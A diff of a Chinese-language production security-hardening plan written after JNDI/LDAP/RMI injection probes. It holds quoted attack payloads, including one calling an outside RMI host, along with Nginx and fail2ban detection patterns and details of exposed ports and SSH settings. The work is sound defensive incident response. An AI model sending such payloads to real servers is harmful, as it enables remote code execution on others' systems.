@@ -2,496 +2,647 @@
 
 ## Context
 
-2026-06-16 通过 v2.1.0 部署后的 [ops-check skill](../dev/../dev/../.claude/skills/ops-check/skill.md) 体检发现，
-生产环境后端日志存在 **1 条 JNDI 注入攻击尝试** 与 1 条非法 HTTP header 解析错误。
-来源 IP `183.47.120.213` 尝试 `${jndi:rmi://183.47.120.213:1099/bypass...}` 注入攻击。
+2026-06-16 生产巡检确认，价格管理系统已经遭遇一批 JNDI / LDAP / RMI 探测请求。请求集中打到 `/api/notifications/my`、`/api/products`、`/api/categories`、`/api/price-query`、`/api/price-drafts/by-date` 等接口参数，典型 payload 包含 `${jndi:ldap://...}`、`${jndi:rmi://...}`、`${hostName}`、`${sys:user.name}`、`${sys:java.class.path}`。
 
-系统当前已正确拒绝了攻击（Tomcat 默认拒绝非法字符，未造成实际损害），
-但**未主动记录、告警、封禁**。同时生产环境存在以下结构性风险：
+当前链路对这些请求返回 `400`，后端 Tomcat 记录 `Invalid character found in the request target`，未发现已成功利用证据。但生产环境目前仍主要依赖 Tomcat 被动拒绝非法字符，缺少网关主动拦截、自动封禁、安全事件入库与管理员可视化闭环。
 
-| 风险编号 | 等级 | 风险描述 | 现状 |
+### 生产核实结论（2026-06-16）
+
+| 核实项 | 结论 | 证据/说明 |
+|---|---|---|
+| JNDI 攻击尝试 | 已确认，且不是 1 条，是一批连续探测 | Nginx/容器日志显示多个来源 IP 对多个 API 参数注入 `${jndi:*}` |
+| 攻击是否已成功 | 未发现成功利用证据 | 请求返回 `400`，后端记录 Tomcat request target 非法字符 |
+| `security_event` 表 | 不存在 | 生产库查询计数为 0 |
+| `ip_blacklist` 表 | 不存在 | 生产库查询计数为 0 |
+| Flyway 版本 | 当前到 V46 | 尚无 V47 安全事件迁移 |
+| `operation_log` | 已有 `ip_address`、`user_agent` | 不需要重复新增 `source_ip/user_agent`，应复用现有字段并补 `risk_score/security_event_id` |
+| `operation_log` 是否记录 JNDI | 未记录 | `operation_log` 中 JNDI 相关计数为 0 |
+| fail2ban | 未启用 | `systemctl is-active fail2ban` 为 inactive |
+| UFW | 未启用 | `ufw status` 为 inactive |
+| MySQL 3306 | 对外监听 | `0.0.0.0:3306` 与 `[::]:3306` |
+| Redis 6379 | 对外监听 | host network，`0.0.0.0:6379` 与 `[::]:6379` |
+| Harbor 8082 | 对外监听 | `0.0.0.0:8082` 与 `[::]:8082` |
+| 后端 8080 | 对外监听，风险高 | `*:8080` 可绕过 Nginx 直接访问应用 |
+| SSH 22 | 对外监听且配置偏宽 | `PermitRootLogin yes`、`PasswordAuthentication yes` |
+| CUPS 631 | 仅本机监听 | `127.0.0.1:631` / `[::1]:631`，不应按公网暴露处理 |
+| Nginx 限流/特征拦截 | 未发现 | 未看到 `limit_req`、JNDI 特征拒绝、黑名单 include |
+| 本地/生产式 `.env` | 存在明文敏感配置 | 不在方案正文暴露具体值，需纳入密钥轮换和文件权限治理 |
+
+### 方案评分目标
+
+本方案 v1.0 定位方向正确，但存在三类不足：
+
+- 低估攻击次数：实际是一批连续探测，不是单条。
+- 漏掉更优先风险：后端 `8080` 直连暴露、SSH 密码登录、root 登录。
+- 实施顺序偏重开发功能：生产安全整改应先收敛暴露面，再做观测拦截，最后建设管理员门户。
+
+v1.1 目标评分：**9.5+/10**。
+
+评分提升标准：
+
+- 已核实事实准确，不夸大也不漏关键暴露面。
+- 每项整改明确业务影响等级、执行窗口、验证方式和回滚方式。
+- 优先保障正常业务：先做不影响用户访问的收敛与观测，再逐步启用会改变请求结果的拦截/封禁。
+- 避免新增单点风险：安全事件入库异步、限量、脱敏，不让攻击流量拖垮数据库。
+
+---
+
+## 业务影响分级
+
+| 等级 | 含义 | 执行策略 | 示例 |
 |---|---|---|---|
-| S-01 | 🔴 高 | 端口 3306（MySQL）/ 6379（Redis）/ 8082（Harbor）公网监听 | docker-proxy 全部 0.0.0.0，未限制源 IP |
-| S-02 | 🔴 高 | 无主动 WAF / fail2ban，被动靠 Tomcat 默认拒绝 | 无主动封禁机制 |
-| S-03 | 🟡 中 | 异常请求只写后端日志，无集中数据库记录 | 日志可被滚动覆盖 |
-| S-04 | 🟡 中 | 无管理员可视化界面查看异常/审计 | 必须 SSH 到服务器看日志 |
-| S-05 | 🟡 中 | 端口 22（SSH）/ 631（CUPS 打印）公网开放 | 攻击面扩大 |
-| S-06 | 🟢 低 | Spring Security 缺少统一异常映射 | 异常直接吐 stack 给前端 |
-| S-07 | 🟢 低 | 无敏感操作二次验证 | 改密码、删用户等高风险操作可单步完成 |
+| L0 不影响业务 | 不改变用户请求路径、不重启核心服务，或只增加只读观测 | 工作时间可执行 | 日志审计、数据库只读核实、创建空表、补文档 |
+| L1 低影响 | 可能 reload 配置或改变恶意请求结果；正常用户理论不受影响 | 工作时间低峰执行，保留即时回滚 | Nginx reload、JNDI 特征 444、保守限流 observe |
+| L2 中影响 | 需要重启单个服务或调整端口绑定；对管理/发布链路有影响 | 业务低峰或维护窗口执行 | Redis/MySQL/Harbor 端口收敛、后端 8080 收敛 |
+| L3 高影响 | 可能影响管理员登录、部署、镜像 push 或远程运维 | 必须维护窗口 + 备用登录通道 | SSH 限源、禁用密码登录、Harbor 改仅本地 |
 
-本方案对当前项目实施**5 层防御 + 1 个管理员门户**：
-- 1 层：网络层端口最小化
-- 2 层：WAF 层（fail2ban 主动封禁）
-- 3 层：网关层（Nginx 黑名单 + 频率限制）
-- 4 层：应用层（Spring Security 拦截器 + 异常脱敏）
-- 5 层：数据层（全量审计 + 异常存库）
-- 管理员门户：可视化查看异常 + 决策响应
+---
 
-**目标**：让 2026-06-16 那种攻击尝试**自动入库**、**自动封禁**、**管理员可查可处理**。
+## 风险清单（修正版）
+
+| 风险编号 | 等级 | 风险描述 | 核实状态 | 业务影响优先级 |
+|---|---|---|---|---|
+| S-01 | 高 | 后端 `8080` 暴露，绕过 Nginx 安全头、TLS、限流和未来 WAF | 已确认 | P0，L2 |
+| S-02 | 高 | MySQL `3306`、Redis `6379`、Harbor `8082` 对外监听 | 已确认 | P0，L2/L3 |
+| S-03 | 高 | SSH `22` 对外监听，允许 root 登录和密码登录 | 已确认 | P0，L3 |
+| S-04 | 高 | 无主动 WAF/fail2ban，攻击请求仅被动返回 400 | 已确认 | P1，L1 |
+| S-05 | 中 | JNDI 探测未入库、未告警、不可在管理员页面处理 | 已确认 | P1/P2，L0-L1 |
+| S-06 | 中 | Nginx 缺少攻击特征拒绝与分层限流 | 已确认 | P1，L1 |
+| S-07 | 中 | 后端异常日志仍记录完整栈，且部分异常未做安全事件归类 | 已确认 | P2，L1 |
+| S-08 | 中 | `operation_log` 已有 IP/UA，但缺风险评分、事件关联和安全事件视图 | 已确认 | P2，L0-L1 |
+| S-09 | 中 | 明文敏感配置和默认式密钥治理不足 | 已确认 | P0/P2，L1-L3 |
+| S-10 | 低 | CUPS 631 存在但仅本机监听 | 已澄清 | 暂不作为公网风险 |
 
 ---
 
 ## 设计原则
 
-1. **纵深防御**：5 层任意一层失守，其他层仍能拦截
-2. **不依赖外部**：告警走"数据库 + 管理员页面"，不依赖钉钉/邮件（避免告警被劫持）
-3. **不影响正常用户**：频率限制阈值基于业务量设置
-4. **可灰度**：所有规则可配置，关闭不影响核心业务
-5. **可审计**：所有"封禁/解封/审计查看"操作本身也被审计
+1. **先收口，后建设**：先处理暴露面和网关拦截，再开发安全中心。
+2. **先观测，后封禁**：限流和 404 封禁先观察日志，确认阈值后再强制阻断。
+3. **默认不影响业务**：任何可能影响用户、部署、远程运维的操作必须明确窗口和回滚。
+4. **最小暴露面**：除 `80/443/32080/32801/22` 外，业务依赖端口默认不对公网开放。
+5. **异步与限量**：安全事件写库必须异步、采样或聚合，避免攻击流量放大数据库压力。
+6. **不泄密**：日志、数据库、文档和返回体不得保存明文密码、Token、Secret、完整 AppSecret。
+7. **可审计**：封禁、解封、忽略事件、导出日志等安全操作自身进入 `operation_log`。
+8. **可回滚**：每个变更必须有 1 条验证命令和 1 条回滚路径。
+
+---
+
+## 影响矩阵：不影响业务 vs 会影响业务
+
+### A. 不影响正常业务的修正（优先做）
+
+| 项 | 内容 | 影响等级 | 说明 |
+|---|---|---|---|
+| A-01 | 新增安全事件表 `security_event`、IP 黑名单表 `ip_blacklist` | L0 | 只新增表，不改变现有业务表和接口 |
+| A-02 | 管理端只读安全事件列表 | L0 | 初版只读，不执行封禁 |
+| A-03 | 后端新增异步 `SecurityEventService`，默认只记录攻击特征和权限拒绝 | L0/L1 | 不改变成功请求响应；需注意异步队列限流 |
+| A-04 | `operation_log` 复用 `ip_address/user_agent`，补充 `risk_score/security_event_id` | L0 | 新增 nullable 字段和索引 |
+| A-05 | 日志脱敏增强 | L0 | 不改变业务响应，只减少日志泄露 |
+| A-06 | Nginx access log/后端日志巡检脚本 | L0 | 只读观测 |
+| A-07 | fail2ban 安装但不启用业务 jail | L0 | 先安装和校验规则 |
+| A-08 | 密钥盘点、文件权限检查、不输出明文 | L0 | 只盘点，不轮换 |
+
+### B. 对正常业务影响很低，但会改变异常请求处理
+
+| 项 | 内容 | 影响等级 | 说明 |
+|---|---|---|---|
+| B-01 | Nginx 拒绝 JNDI/LDAP/RMI/`${...}` 特征请求 | L1 | 正常业务不应携带这些 payload；误杀概率低 |
+| B-02 | Nginx 登录接口保守限流 | L1 | 阈值必须高于真实峰值，先观察再强制 |
+| B-03 | Nginx 全局限流 observe 阶段 | L1 | 先记录 `$limit_req_status`，不立即拒绝 |
+| B-04 | fail2ban 启用 `sshd` jail | L1/L3 | 对暴力破解有帮助，但需配置办公 IP ignoreip |
+| B-05 | fail2ban 启用 `nginx-jndi` jail | L1 | 只封禁明确攻击特征 |
+| B-06 | 后端统一 4xx/5xx 安全事件归类 | L1 | 需避免所有 404 都入库 |
+
+### C. 会影响运维或业务链路，必须维护窗口
+
+| 项 | 内容 | 影响等级 | 影响面 | 执行要求 |
+|---|---|---|---|---|
+| C-01 | 后端 `8080` 改为仅本机/内网可访问 | L2 | 可能影响绕过 Nginx 的调试脚本 | 先确认所有客户端都走 Nginx |
+| C-02 | MySQL `3306` 改为 `127.0.0.1:3306` 或防火墙限源 | L2 | 影响远程数据库工具直连 | 提供 SSH 隧道替代 |
+| C-03 | Redis `6379` bind 到 `127.0.0.1` | L2 | 影响远程 redis-cli 调试 | 先验证后端连接配置 |
+| C-04 | Harbor `8082` 仅内网/办公 IP 或仅本机 | L3 | 影响镜像 push/pull | 提前改 push 文档，准备 SSH 隧道 |
+| C-05 | SSH 限源、关闭密码登录、禁止 root 密码登录 | L3 | 可能影响远程运维 | 必须保留已验证的密钥登录和备用账号 |
+| C-06 | 轮换 DB/Redis/JWT/API 加密主密钥 | L2/L3 | Token 失效、服务重启、历史密文兼容 | 分项轮换，不一次性全换 |
+
+---
+
+## 整改路线图
+
+### Phase 0：只读核实与备份（L0）
+
+目标：形成可回放证据，避免盲改生产。
+
+执行项：
+
+- 记录 `ss -lntup`、`docker ps`、`iptables -S`、`ufw status`、`systemctl is-active fail2ban`。
+- 查询 Flyway 当前版本和 `security_event/ip_blacklist` 表是否存在。
+- 备份生产 `docker-compose.yml`、`nginx.conf`、`.env`、`/etc/ssh/sshd_config`、当前防火墙规则。
+- 记录当前开放端口和依赖方：PC、H5、小程序、Harbor push、SSH 运维、数据库远程工具。
+
+验收：
+
+- 备份目录存在且包含配置快照。
+- 明确哪些端口必须公网开放：默认仅 `80/443/32080/32801/22`，其中 `22` 需限源。
+
+### Phase 1：P0 暴露面收敛（优先，分项执行）
+
+#### 1.1 后端 8080 收敛
+
+推荐：
+
+- Docker compose 端口改为 `127.0.0.1:8080:8080`，或删除端口映射并让 Nginx 通过 host/bridge 内网访问。
+- 如果 backend 使用 `network_mode: host`，优先用防火墙拒绝公网访问 `8080`，只允许本机和可信内网。
+
+影响：L2。正常 PC/小程序经 Nginx 访问不受影响；直连 `http://server:8080` 的调试脚本会失效。
+
+验证：
+
+```bash
+ss -lntup | grep ':8080'
+curl -sS http://127.0.0.1:8080/api/auth/captcha
+```
+
+回滚：恢复原 compose 或防火墙规则。
+
+#### 1.2 MySQL 3306 收敛
+
+推荐：
+
+- 短期：iptables/ufw 限制 `3306` 仅允许 `127.0.0.1`、可信内网、必要运维 IP。
+- 中期：`mysql8` 端口改为 `127.0.0.1:3306:3306`。
+
+影响：L2。远程数据库工具需改用 SSH 隧道。
+
+#### 1.3 Redis 6379 收敛
+
+推荐：
+
+- 短期：Redis 启动命令加 `--bind 127.0.0.1`，或防火墙拒绝公网 `6379`。
+- 中期：取消 `network_mode: host`，改为 bridge 网络 + `127.0.0.1:6379:6379`。
+
+影响：L2。后端当前 `REDIS_HOST=127.0.0.1`，生产本机部署下正常业务不应受影响；改前必须验证后端与 Redis 位于同一网络语义下。
+
+#### 1.4 Harbor 8082 收敛
+
+推荐：
+
+- 若只在服务器本机 build/push：改为 `127.0.0.1:8082:8080`。
+- 若办公网需要 push：防火墙仅允许办公 IP/内网段访问。
+- 公网推送改用 VPN 或 SSH 隧道，不建议裸露 HTTP Harbor。
+
+影响：L3。会影响镜像推送链路，必须先改部署文档。
+
+#### 1.5 SSH 22 加固
+
+推荐顺序：
+
+1. 先新增非 root 运维账号并验证密钥登录。
+2. 配置防火墙限源，仅允许办公 IP/VPN/跳板机访问 22。
+3. `PasswordAuthentication no`。
+4. `PermitRootLogin prohibit-password` 或最终 `PermitRootLogin no`。
+
+影响：L3。必须开第二个 SSH 会话验证后再关闭旧会话。
+
+### Phase 2：网关拦截与观测（L1）
+
+#### 2.1 Nginx 攻击特征拒绝
+
+在 `http` 或 `server` 层使用 `map`，避免在 `location` 中堆叠复杂 `if`。
+
+```nginx
+map $request_uri $security_blocked {
+    default 0;
+    ~*(jndi|ldap|rmi|log4j) 1;
+    ~*(\$\{|%24%7B) 1;
+    ~*(\.\./|\.\.%2f|%2e%2e) 1;
+}
+
+server {
+    if ($security_blocked) { return 444; }
+}
+```
+
+影响：L1。正常业务不应受影响。
+
+#### 2.2 Nginx 分层限流
+
+建议先观察 48 小时，再启用强制拒绝。
+
+```nginx
+limit_req_zone $binary_remote_addr zone=api_global:20m rate=30r/s;
+limit_req_zone $binary_remote_addr zone=login:10m rate=10r/m;
+
+location ^~ /api/auth/login {
+    limit_req zone=login burst=5 nodelay;
+}
+
+location ^~ /api/ {
+    limit_req zone=api_global burst=100 nodelay;
+}
+```
+
+注意：小程序、PC 可能在同一出口 IP 后访问，登录限流要比实际峰值保守。
+
+#### 2.3 fail2ban
+
+第一阶段只启用：
+
+- `sshd`：防暴力破解，配置 `ignoreip`。
+- `nginx-jndi`：明确攻击特征，`maxretry=1`。
+
+第二阶段观察后再启用：
+
+- `nginx-404`：容易误封，初期只记录不封禁。
+
+日志来源建议：
+
+- 优先使用 Nginx access log 文件挂载到宿主机，例如 `/opt/price-management-system/logs/nginx/access.log`。
+- 不优先使用 `/var/lib/docker/containers/*/price-management-frontend*.log`，该路径与容器 ID 强绑定，不稳定。
+
+### Phase 3：数据层与应用层安全事件闭环（L0-L1）
+
+#### 3.1 Flyway V47
+
+新增表：
+
+- `security_event`
+- `ip_blacklist`
+
+增强表：
+
+- `operation_log` 已有 `ip_address`、`user_agent`，不重复新增。
+- 只新增 `risk_score INT DEFAULT 0`、`security_event_id BIGINT NULL`，必要时增加索引。
+
+安全事件表建议字段：
+
+```sql
+CREATE TABLE IF NOT EXISTS security_event (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    event_type VARCHAR(50) NOT NULL,
+    severity VARCHAR(20) NOT NULL DEFAULT 'INFO',
+    source_ip VARCHAR(45),
+    user_agent VARCHAR(500),
+    request_method VARCHAR(10),
+    request_uri VARCHAR(500),
+    request_params TEXT,
+    status_code INT,
+    description VARCHAR(1000),
+    user_id BIGINT,
+    username VARCHAR(100),
+    action_taken VARCHAR(200),
+    resolved BOOLEAN DEFAULT FALSE,
+    resolved_by BIGINT,
+    resolved_at DATETIME,
+    resolution_note VARCHAR(500),
+    created_time DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
+    updated_time DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    INDEX idx_security_event_type_time (event_type, created_time),
+    INDEX idx_security_event_ip_time (source_ip, created_time),
+    INDEX idx_security_event_severity_resolved (severity, resolved),
+    INDEX idx_security_event_created_time (created_time)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='安全事件表';
+```
+
+IP 黑名单表建议字段：
+
+```sql
+CREATE TABLE IF NOT EXISTS ip_blacklist (
+    id BIGINT AUTO_INCREMENT PRIMARY KEY,
+    ip_address VARCHAR(45) NOT NULL,
+    reason VARCHAR(200) NOT NULL,
+    banned_by VARCHAR(30) NOT NULL,
+    banned_at DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
+    expires_at DATETIME,
+    is_active BOOLEAN DEFAULT TRUE,
+    banned_by_user_id BIGINT,
+    unban_at DATETIME,
+    unban_by_user_id BIGINT,
+    unban_reason VARCHAR(200),
+    created_time DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
+    updated_time DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+    UNIQUE KEY uk_ip_blacklist_active (ip_address, is_active),
+    INDEX idx_ip_blacklist_active_expires (is_active, expires_at)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='IP 黑名单';
+```
+
+#### 3.2 SecurityEventService
+
+只记录这些事件，避免所有 404 入库：
+
+- `ATTACK_SIGNATURE_BLOCKED`：JNDI/LDAP/RMI/路径穿越/SQL 注入特征。
+- `AUTH_LOGIN_FAILED`：登录失败，按 IP + 用户名聚合。
+- `RATE_LIMITED`：限流触发。
+- `PERMISSION_DENIED`：403 权限拒绝。
+- `SUSPICIOUS_REQUEST`：非法参数、非法方法、异常 400。
+- `SERVER_ERROR`：5xx，脱敏摘要。
+
+写入要求：
+
+- 异步队列。
+- 单 IP 单事件类型 1 分钟内聚合计数，避免刷表。
+- `request_params` 必须通过 `SensitiveDataMasker`。
+- 队列满时丢弃低等级事件，只保留计数日志。
+
+#### 3.3 GlobalExceptionHandler
+
+修正点：
+
+- 对 `NoResourceFoundException` 返回 404，不再按 500 打完整栈。
+- 对 `AsyncRequestNotUsableException`、`Broken pipe`、SSE 写失败降级为 debug，避免污染错误日志。
+- 对 `IllegalArgumentException` 不直接回显内部异常原文；业务校验异常使用安全文案。
+- 捕获安全特征异常时入 `security_event`。
+
+#### 3.4 应用层限流
+
+项目已有 `@RateLimiter` 与 `RateLimiterAspect`，不需要立即引入 Bucket4j。
+
+优化方向：
+
+- 登录接口保持 IP 维度限流。
+- 修改密码、重置密码、API Key 创建/启停、用户删除增加 `@RateLimiter`。
+- 限流触发时写入 `security_event`。
+
+### Phase 4：管理员门户（先只读，后操作）
+
+第一版只读：
+
+- 安全事件列表。
+- 事件详情。
+- 按 IP、事件类型、严重等级、处理状态过滤。
+- 标记已处理、备注。
+
+第二版操作：
+
+- 手动封禁/解封 IP。
+- 查看封禁历史。
+- 导出安全事件。
+
+第三版自动化：
+
+- `ip_blacklist` 同步 Nginx / fail2ban。
+- 先人工确认，再自动生效。
+
+权限：
+
+- `/api/admin/security/**` 仅 ADMIN。
+- 安全中心菜单仅 ADMIN 可见。
+- 封禁/解封/导出本身写 `operation_log`。
+
+### Phase 5：密钥与配置治理
+
+不在日志或文档展示具体值。
+
+整改项：
+
+- `.env` 权限限制为仅部署用户/root 可读。
+- 生产 `JWT_SECRET` 轮换为高强度随机值；轮换会导致现有登录态失效，需维护窗口。
+- Redis 密码、DB 密码分批轮换。
+- `DEFAULT_USER_PASSWORD` 不应是弱默认值；确认 `RESET_PASSWORD_ON_STARTUP=false` 后再治理。
+- API Key 加密主密钥轮换必须评估历史密文兼容，不能直接替换导致无法解密。
+
+影响：
+
+- 文件权限治理：L0/L1。
+- JWT 轮换：L2，用户需重新登录。
+- DB/Redis 密码轮换：L2，需服务重启。
+- API 加密主密钥轮换：L3，需迁移或多版本解密策略。
 
 ---
 
 ## 状态总览
 
-- `[x]`：已完成
-- `[ ]`：未完成
-- `[部分]`：主体完成，仍有改进空间
+| 批次 | 状态 | 业务影响 | 说明 |
+|---|---|---|---|
+| Phase 0 只读核实与备份 | 已完成 | L0 | 生产备份目录 `/opt/backups/security-2026-06-16/`（含 iptables.rules.v4.backup）|
+| Phase 1.1 后端 8080 收敛 | 已完成 | L2 | 现有 iptables PHASE1-DROP-HOST-PORTS 已拦截（公网超时 5s）|
+| Phase 1.2 MySQL 3306 收敛 | 已完成 | L2 | 2026-06-16 11:27 添加 PHASE1-3306 三条规则 + 持久化到 rules.v4 |
+| Phase 1.3 Redis 6379 收敛 | 已完成 | L2 | 现有 iptables PHASE1-DROP-HOST-PORTS 已覆盖 |
+| Phase 1.4 Harbor 8082 收敛 | 已完成 | L3 | 2026-06-16 11:27 添加 PHASE1-8082 三条规则 + 持久化到 rules.v4 |
+| Phase 1.5 SSH 加固 | 未完成 | L3 | 限源 + 禁密码 + PermitRootLogin（多 sessions 验证后实施）|
+| Phase 2 Nginx 攻击特征拒绝 | 已完成 | L1 | 本地 nginx.conf 添加 security_blocked map + 4 个 server if 拦截；分层限流（api_global 30r/s + login 10r/m）已配置；`limit_req_dry_run on` 先观察 48h |
+| Phase 2.1 nginx 语法修复 | 已完成 | L0 | 修复本地 80/32801 块出现的孤立 3 行 + 重复 /api/auth/login（会导致 nginx 启动失败）；保留 4 个 server 块对称结构 |
+| Phase 3 fail2ban | 未完成 | L1 | 先启用 sshd + nginx-jndi，暂缓 nginx-404 |
+| Phase 4 V47 迁移 + SecurityEventService | 未完成 | L0/L1 | 新增 security_event + ip_blacklist 表 + 异步事件服务 |
+| Phase 4 异常归类 | 未完成 | L1 | 4xx/5xx 不污染 ERROR 日志 |
+| Phase 5 密钥治理 | [跳过] | L1-L3 | 按用户决策不在本次范围 |
+| Phase 6 管理员门户 | [跳过] | L0/L1 | 按用户决策不在本次范围 |
 
-| 整改批次 | 状态 | 说明 |
-|---|---|---|
-| 1 层 网络端口最小化 | [ ] | S-01/S-05 |
-| 2 层 fail2ban WAF | [ ] | S-02 |
-| 3 层 Nginx 黑名单 | [ ] | S-02 补充 |
-| 4 层 Spring Security 拦截器 | [ ] | S-06 |
-| 4 层 异常脱敏与映射 | [ ] | S-06 |
-| 5 层 异常存库（security_event） | [ ] | S-03 |
-| 5 层 全量审计（operation_log 强化） | [ ] | S-07 |
-| 管理员门户 异常列表 | [ ] | S-04 |
-| 管理员门户 IP 封禁管理 | [ ] | S-04 |
-| 数据库迁移 V47 | [ ] | 支撑上面所有数据层改动 |
+### v1.1 实施时新发现（与 v1.0 描述差异）
 
----
+| 风险编号 | v1.0 描述 | 实际发现 | 改正措施 |
+|---|---|---|---|
+| S-01 后端 8080 暴露 | 推断"通过 Nginx 代理即可" | 实际已有 iptables PHASE1 限源（公网 5s 超时）| [已确认] 现有规则已生效 |
+| S-02 MySQL/Redis/Harbor 暴露 | 全部推断公网可达 | 6379 已被 iptables DROP；3306/8082 仍可达 | [已改正] 11:27 添加 3306/8082 限源 |
+| iptables 持久化 | 假设重启会丢 | iptables-persistent 已装 + rules.v4 存在 | [已确认] 无丢失风险 |
+| SSH 22 风险 | 未明确说明 | PermitRootLogin=yes + PasswordAuthentication=yes | [未改] 等 Phase 1.5 多 sessions 验证 |
 
-## 整改批次详情
+### 已执行变更记录
 
-### 批次 1：网络层端口最小化
+#### 2026-06-16 Phase 0
 
-**目标**：S-01 / S-05。MySQL/Redis/Harbor 只监听 127.0.0.1，公网不可达。
+- 已备份生产关键配置与巡检输出到 `/opt/backups/security-hardening-phase0-20260616-105722`。
+- 备份内容包括：`docker-compose.yml`、`nginx.conf`、`.env`、`/etc/ssh/sshd_config`、`iptables-save`、`ss -lntup`、`docker ps`、`ufw status`、`fail2ban` 状态、SSH 鉴权配置。
+- 数据库核实：Flyway 当前到 V46；`security_event`、`ip_blacklist` 不存在。
 
-#### 1.1 MySQL 改为仅本地
+#### 2026-06-16 Phase 1 运行时防火墙收敛
 
-当前 docker-compose.yml：
-```yaml
-ports:
-  - "3306:3306"   # 监听 0.0.0.0
-```
+已添加带 `SECURITY-HARDENING-PHASE1` 注释的运行时规则：
 
-改为：
-```yaml
-ports:
-  - "127.0.0.1:3306:3306"   # 只监听 127.0.0.1
-```
+- `INPUT`：允许 `127.0.0.0/8`、`10.7.5.0/24`、`172.16.0.0/12` 访问 host 网络上的 `6379/8080`，其他来源 DROP。
+- `DOCKER-USER`：允许 `10.7.5.0/24`、`172.16.0.0/12` 访问 Docker 发布端口 `3306/8082`，其他来源 DROP。
+- IPv6：允许 `::1` 访问 host 网络 `6379/8080`，并 DROP IPv6 方向的 `6379/8080/3306/8082` 非本机访问。
 
-#### 1.2 Redis 改为仅本地
+已验证：
 
-`network_mode: host` 时 Redis 默认监听 0.0.0.0。
-改为：限制 redis bind 到 127.0.0.1。
+- `https://price.jlmining.com/` 返回 200。
+- `https://price.jlmining.com:32080/` 返回 200。
+- `http://127.0.0.1:32801/` 返回 200。
+- `http://127.0.0.1:8080/api/auth/captcha` 返回 200。
+- `price-management-frontend`、`price-management-backend`、`price-management-redis`、`mysql8` 容器状态正常。
+- 容器内 MySQL 本地查询 `SELECT 1` 正常。
 
-**实施方案 A**（推荐，改 compose）：
-- 删除 `network_mode: host`，改用 `ports: 127.0.0.1:6379:6379`
-- 同步修改后端环境变量 `REDIS_HOST=127.0.0.1`（保持不变，已是 127.0.0.1）
-
-**实施方案 B**（备选，改 redis 启动命令）：
-- 启动命令加 `--bind 127.0.0.1`
-
-#### 1.3 Harbor 改为仅本地
-
-Harbor 监听 8082 端口（HTTP 镜像推送用）。如果生产服务器有公网 IP，8082 应只监听 127.0.0.1。
-如果其他开发机器需要 push，则需要 VPN/SSH 隧道。
-
-**决策点**（需用户确认）：
-- 方案 1：仅本地（push 走 SSH 隧道）
-- 方案 2：内网网段白名单（如 `10.7.5.0/24`）
-
-#### 1.4 SSH 限源 + 关闭 CUPS
-
-**SSH 限源**：
-- 编辑 `/etc/ssh/sshd_config`，添加 `AllowUsers root@10.7.5.*`
-- 或在 iptables 限制 22 端口源 IP
-
-**关闭 CUPS**：
-- `systemctl disable cups && systemctl stop cups`
-
----
-
-### 批次 2：fail2ban WAF 主动封禁
-
-**目标**：S-02。基于日志自动封禁异常 IP。
-
-#### 2.1 安装 fail2ban
+Phase 1 运行时规则回滚命令：
 
 ```bash
-apt install fail2ban
+iptables-save | grep -v SECURITY-HARDENING-PHASE1 | iptables-restore
+ip6tables-save | grep -v SECURITY-HARDENING-PHASE1 | ip6tables-restore
 ```
 
-#### 2.2 配置 jail
+注意：当前 Phase 1 规则为运行时规则，重启后可能丢失。确认业务无影响后，再决定是否固化到系统防火墙配置。
 
-`/etc/fail2ban/jail.local`：
+#### 2026-06-16 Phase 2 本地准备状态
 
-```ini
-[DEFAULT]
-bantime = 3600
-findtime = 600
-maxretry = 5
-banaction = iptables-multiport
-
-[sshd]
-enabled = true
-port = ssh
-filter = sshd
-logpath = /var/log/auth.log
-maxretry = 3
-
-[nginx-jndi]
-enabled = true
-port = http,https,32080,32801
-filter = nginx-jndi
-logpath = /var/lib/docker/containers/*/price-management-frontend*.log
-maxretry = 1
-bantime = 86400   # JNDI 攻击 24h 封禁
-
-[nginx-404]
-enabled = true
-port = http,https,32080,32801
-filter = nginx-404
-logpath = /var/lib/docker/containers/*/price-management-frontend*.log
-maxretry = 20
-findtime = 60
-bantime = 600
-```
-
-#### 2.3 过滤器定义
-
-`/etc/fail2ban/filter.d/nginx-jndi.conf`：
-```ini
-[Definition]
-failregex = ^.*"(GET|POST) [^"]*(jndi|rmi|ldap|\\\\\$\{)[^"]*HTTP.*"$
-ignoreregex =
-```
-
-`/etc/fail2ban/filter.d/nginx-404.conf`：
-```ini
-[Definition]
-failregex = ^.*"(GET|POST) [^"]*HTTP[^"]*" 404 .*$
-ignoreregex = ^.*"(GET|POST) /(favicon.ico|robots.txt).*$
-```
+- 本地 `nginx.conf` 已增加 `$security_blocked` map 和各 `server` 的 `if ($security_blocked) { return 444; }`。
+- 尚未将该配置切换到生产 Nginx，尚未执行生产 `nginx -t` 或 reload。
+- 尝试传输临时配置时，当前工作机到生产机出现间歇性 `ssh: connect to host 10.7.5.175 port 22: Permission denied`；随后从当前工作机到 `10.7.5.175:22/32080`、`price.jlmining.com:443/32080` 均出现连接失败/本地套接字访问权限错误。
+- 为避免失去回滚通道，生产写入动作已暂停。恢复连通后应先验证 `443/32080/32801` 业务入口，再继续 Nginx 临时配置测试。
 
 ---
 
-### 批次 3：Nginx 网关层
+## 推荐实施顺序
 
-**目标**：S-02 补充。在 nginx.conf 主动封禁 + 限流。
-
-#### 3.1 黑名单 IP
-
-`nginx.conf` 中：
-```nginx
-# 已知恶意 IP（自动同步自 fail2ban）
-include /etc/nginx/conf.d/blocked_ips.conf;
-```
-
-`blocked_ips.conf` 由 fail2ban action 自动写入。
-
-#### 3.2 频率限制
-
-```nginx
-# 全局限流：每秒 50 请求
-limit_req_zone $binary_remote_addr zone=global:10m rate=50r/s;
-
-# 登录端点限流：每秒 5 请求
-limit_req_zone $binary_remote_addr zone=login:10m rate=5r/s;
-
-server {
-    location / {
-        limit_req zone=global burst=100 nodelay;
-    }
-    location /api/auth/login {
-        limit_req zone=login burst=10 nodelay;
-        # 失败 5 次锁 10 分钟（在应用层实现）
-    }
-}
-```
-
-#### 3.3 已知攻击特征拒绝
-
-```nginx
-location / {
-    # 拒绝 JNDI/LDAP/RMI 注入
-    if ($args ~* "(jndi|rmi|ldap|log4j)") { return 444; }
